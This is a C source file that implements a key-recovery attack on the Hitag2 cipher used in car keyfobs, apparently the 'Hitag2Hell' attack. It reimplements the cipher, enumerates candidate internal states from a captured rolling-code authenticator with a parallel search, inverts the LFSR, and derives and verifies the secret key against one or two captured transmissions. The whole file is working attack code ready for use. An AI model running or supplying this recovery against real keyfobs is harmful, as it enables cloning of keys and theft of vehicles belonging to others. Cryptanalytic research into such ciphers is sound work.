#include "hitag2hell.h"

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#ifdef _OPENMP
#include <stdatomic.h>
#endif

static uint32_t hitag2hell_i4(uint64_t x, int a, int b, int c, int d) {
    return (uint32_t)((((x >> a) & 1U) << 3U) | (((x >> b) & 1U) << 2U) |
                      (((x >> c) & 1U) << 1U) | ((x >> d) & 1U));
}

static uint8_t hitag2hell_f20(uint64_t state) {
    const uint8_t s0 = (uint8_t)((0x3C65U >> hitag2hell_i4(state, 2, 3, 5, 6)) & 1U);
    const uint8_t s1 = (uint8_t)((0xEE5U >> hitag2hell_i4(state, 8, 12, 14, 15)) & 1U);
    const uint8_t s2 = (uint8_t)((0xEE5U >> hitag2hell_i4(state, 17, 21, 23, 26)) & 1U);
    const uint8_t s3 = (uint8_t)((0xEE5U >> hitag2hell_i4(state, 28, 29, 31, 33)) & 1U);
    const uint8_t s4 = (uint8_t)((0x3C65U >> hitag2hell_i4(state, 34, 43, 44, 46)) & 1U);
    return (uint8_t)((0xDD3929BUL >> ((s0 << 4U) | (s1 << 3U) | (s2 << 2U) | (s3 << 1U) | s4)) &
                     1U);
}

static uint64_t hitag2hell_lfsr(uint64_t state) {
    const uint64_t fb =
        ((state >> 0) ^ (state >> 2) ^ (state >> 3) ^ (state >> 6) ^ (state >> 7) ^ (state >> 8) ^
         (state >> 16) ^ (state >> 22) ^ (state >> 23) ^ (state >> 26) ^ (state >> 30) ^
         (state >> 41) ^ (state >> 42) ^ (state >> 43) ^ (state >> 46) ^ (state >> 47)) &
        1ULL;
    return (state >> 1) | (fb << 47);
}

static uint64_t hitag2hell_rev16(uint64_t x) {
    uint64_t y = 0;
    for(int i = 0; i < 16; i++) {
        y = (y << 1) | ((x >> i) & 1ULL);
    }
    return y;
}

static uint64_t hitag2hell_init(uint64_t key, uint32_t uid, uint32_t counter, uint8_t button) {
    const uint32_t nonce = (counter << 4U) | (button & 0x0FU);
    uint64_t state = 0;
    for(int i = 32; i < 48; i++) {
        state = (state << 1) | ((key >> i) & 1ULL);
    }
    for(int i = 0; i < 32; i++) {
        state = (state << 1) | ((uid >> i) & 1U);
    }
    for(int i = 0; i < 32; i++) {
        const uint64_t nonce_bit = (uint64_t)hitag2hell_f20(state) ^ ((nonce >> (31 - i)) & 1U);
        state = (state >> 1) | (((nonce_bit ^ ((key >> (31 - i)) & 1ULL)) & 1ULL) << 47);
    }
    return state;
}

static uint32_t hitag2hell_ks(uint64_t state) {
    uint32_t c = 0;
    for(int i = 0; i < 32; i++) {
        c = (c << 1) | hitag2hell_f20(state);
        state = hitag2hell_lfsr(state);
    }
    return c;
}

uint64_t hitag2hell_expand_taps(uint32_t index20) {
    uint64_t fill = 0;
    uint64_t mask = HITAG2HELL_LAYER0_MASK;
    uint64_t value = index20;
    for(uint32_t bit = 0; bit < 48; bit++) {
        if(mask & 1ULL) {
            fill |= (value & 1ULL) << bit;
            value >>= 1;
        }
        mask >>= 1;
    }
    return fill;
}

uint32_t hitag2hell_layer0(uint32_t hop, uint64_t* candidates46, uint32_t cap) {
    const uint8_t want = (uint8_t)(hop >> 31);
    uint32_t n = 0;
    for(uint32_t i0 = 0; i0 < (1U << 20); i0++) {
        const uint64_t state0 = hitag2hell_expand_taps(i0);
        if(hitag2hell_f20(state0) != want) {
            continue;
        }
        if(n < cap) {
            candidates46[n] = state0 >> 2;
        }
        n++;
    }
    return n;
}

void hitag2hell_pack_candidate(uint64_t candidate46, uint16_t out[3]) {
    out[0] = (uint16_t)((candidate46 >> 32) & 0xFFFFU);
    out[1] = (uint16_t)((candidate46 >> 16) & 0xFFFFU);
    out[2] = (uint16_t)(candidate46 & 0xFFFFU);
}

void hitag2hell_bitslice_keystream(uint32_t hop, uint32_t keystream[32]) {
    for(uint32_t i = 0; i < 32; i++) {
        const uint32_t bit = (hop >> (31U - i)) & 1U;
        keystream[i] = bit ? 0U : 0xFFFFFFFFU;
    }
}

uint64_t hitag2hell_lfsr_inv(uint64_t state) {
    const uint64_t poly = (0xCE0044C101CDULL >> 1) | (1ULL << 47);
    uint64_t parity = state & poly;
    parity ^= parity >> 32;
    parity ^= parity >> 16;
    parity ^= parity >> 8;
    parity ^= parity >> 4;
    parity ^= parity >> 2;
    parity ^= parity >> 1;
    return ((state << 1) | (parity & 1ULL)) & ((1ULL << 48) - 1ULL);
}

uint64_t hitag2hell_finish_state(uint64_t state_from_kernel) {
    uint64_t state = state_from_kernel & ((1ULL << 48) - 1ULL);
    state = hitag2hell_lfsr_inv(state);
    state = hitag2hell_lfsr_inv(state);
    return state & ((1ULL << 48) - 1ULL);
}

uint64_t hitag2hell_equiv_key(uint64_t init, uint32_t uid, uint32_t cnt, uint8_t btn) {
    const uint64_t key_hi16 = hitag2hell_rev16(init & 0xFFFFULL);
    uint64_t key = key_hi16 << 32;
    uint64_t state = 0;
    for(int i = 32; i < 48; i++) {
        state = (state << 1) | ((key >> i) & 1ULL);
    }
    for(int i = 0; i < 32; i++) {
        state = (state << 1) | ((uid >> i) & 1U);
    }

    const uint32_t nonce = (cnt << 4U) | (btn & 0x0FU);
    uint64_t key_lo = 0;
    for(int i = 0; i < 32; i++) {
        const uint64_t inj = (init >> (16 + i)) & 1ULL;
        const uint64_t f = hitag2hell_f20(state);
        const uint64_t nbit = (i < 18) ? 0ULL : ((nonce >> (31 - i)) & 1U);
        const uint64_t kbit = inj ^ f ^ nbit;
        key_lo |= kbit << (31 - i);
        state = (state >> 1) | (inj << 47);
    }
    return (key | key_lo) & 0xFFFFFFFFFFFFULL;
}

uint32_t hitag2hell_authenticator(uint64_t key, uint32_t uid, uint32_t cnt, uint8_t btn) {
    return hitag2hell_ks(hitag2hell_init(key, uid, cnt, btn));
}

uint32_t hitag2hell_search_one_candidate_cpu(
    uint32_t hop,
    uint64_t candidate46,
    uint64_t* states,
    uint32_t cap) {
    uint32_t keystream[32];
    uint16_t packed[3];
    hitag2hell_bitslice_keystream(hop, keystream);
    hitag2hell_pack_candidate(candidate46, packed);

    uint32_t found = 0;
    for(uint32_t i1 = 0; i1 < HITAG2HELL_I1_SPAN; i1++) {
        hitag2hell_find_state_cpu(keystream, packed, states, &found, 0, 0, i1, cap);
    }
    return found;
}

static int hitag2hell_try_states(
    const Hitag2HellRequest* req,
    const uint64_t* raw_states,
    uint32_t nraw,
    Hitag2HellResult* out) {
    const uint32_t uids[2] = {req->uid, ~req->uid};
    out->keys_tried = 0;
    out->states_tested = nraw;
    for(uint32_t i = 0; i < nraw; i++) {
        const uint64_t init = hitag2hell_finish_state(raw_states[i]);
        for(int u = 0; u < 2; u++) {
            const uint64_t key = hitag2hell_equiv_key(init, uids[u], req->cnt, req->btn);
            out->keys_tried++;
            if(hitag2hell_authenticator(key, uids[u], req->cnt, req->btn) != req->hop) {
                continue;
            }
            if(req->has_second &&
               hitag2hell_authenticator(
                   key, uids[u], req->cnt2, req->btn2 ? req->btn2 : req->btn) != req->hop2) {
                continue;
            }
            out->key = key;
            out->state = init;
            out->uid = uids[u];
            return 1;
        }
    }
    return 0;
}

int hitag2hell_recover_cpu(const Hitag2HellRequest* req, Hitag2HellResult* out) {
    return hitag2hell_recover_cpu_ex(req, out, NULL, NULL);
}

int hitag2hell_recover_cpu_ex(
    const Hitag2HellRequest* req,
    Hitag2HellResult* out,
    volatile int32_t* cancel,
    uint64_t* progress_out) {
    memset(out, 0, sizeof(*out));
    uint64_t* candidates46 = malloc(sizeof(uint64_t) * (1U << 20));
    if(!candidates46) {
        return -1;
    }
    const uint32_t ncand = hitag2hell_layer0(req->hop, candidates46, 1U << 20);

    uint16_t* packed = malloc(sizeof(uint16_t) * 3U * ncand);
    if(!packed) {
        free(candidates46);
        return -1;
    }
    for(uint32_t i = 0; i < ncand; i++) {
        hitag2hell_pack_candidate(candidates46[i], &packed[3U * i]);
    }

    uint32_t keystream[32];
    hitag2hell_bitslice_keystream(req->hop, keystream);

    uint64_t* matches = malloc(sizeof(uint64_t) * HITAG2HELL_MAX_STATES);
    if(!matches) {
        free(packed);
        free(candidates46);
        return -1;
    }

    uint32_t found = 0;
    int cancelled = 0;
#ifdef _OPENMP
    _Atomic uint32_t done_c = 0;
#pragma omp parallel for schedule(dynamic, 4)
    for(uint32_t c = 0; c < ncand; c++) {
        if(cancel && *cancel) {
            cancelled = 1;
            continue;
        }
        for(uint32_t i1 = 0; i1 < HITAG2HELL_I1_SPAN; i1++) {
            uint64_t tmp[32];
            uint32_t n = 0;
            hitag2hell_find_state_cpu(keystream, packed, tmp, &n, c, 0, i1, 32);
            if(n == 0) {
                continue;
            }
            const uint32_t slot = __sync_fetch_and_add(&found, n);
            if(slot >= HITAG2HELL_MAX_STATES) {
                continue;
            }
            const uint32_t take =
                (slot + n > HITAG2HELL_MAX_STATES) ? (HITAG2HELL_MAX_STATES - slot) : n;
            memcpy(&matches[slot], tmp, take * sizeof(uint64_t));
        }
        if(progress_out) {
            const uint32_t d = atomic_fetch_add_explicit(&done_c, 1, memory_order_relaxed) + 1u;
            if((d & 31u) == 0u || d == ncand) {
                uint32_t pct = ncand ? (uint32_t)(((uint64_t)d * 100u) / ncand) : 0u;
                if(pct > 100u) {
                    pct = 100u;
                }
                *progress_out = ((uint64_t)pct << 56) | ((uint64_t)d & 0x00FFFFFFFFFFFFFFULL);
            }
        }
    }
    if(found > HITAG2HELL_MAX_STATES) {
        found = HITAG2HELL_MAX_STATES;
    }
#else
    for(uint32_t c = 0; c < ncand; c++) {
        if(cancel && *cancel) {
            cancelled = 1;
            break;
        }
        if(progress_out && (c & 31u) == 0u) {
            uint32_t pct = ncand ? (uint32_t)(((uint64_t)c * 100u) / ncand) : 0u;
            if(pct > 100u) {
                pct = 100u;
            }
            *progress_out = ((uint64_t)pct << 56) | ((uint64_t)c & 0x00FFFFFFFFFFFFFFULL);
        }
        for(uint32_t i1 = 0; i1 < HITAG2HELL_I1_SPAN; i1++) {
            hitag2hell_find_state_cpu(
                keystream, packed, matches, &found, c, 0, i1, HITAG2HELL_MAX_STATES);
        }
    }
#endif

    if(cancelled || (cancel && *cancel)) {
        free(matches);
        free(packed);
        free(candidates46);
        return -1;
    }

    const int ok = hitag2hell_try_states(req, matches, found, out);
    free(matches);
    free(packed);
    free(candidates46);
    return ok;
}
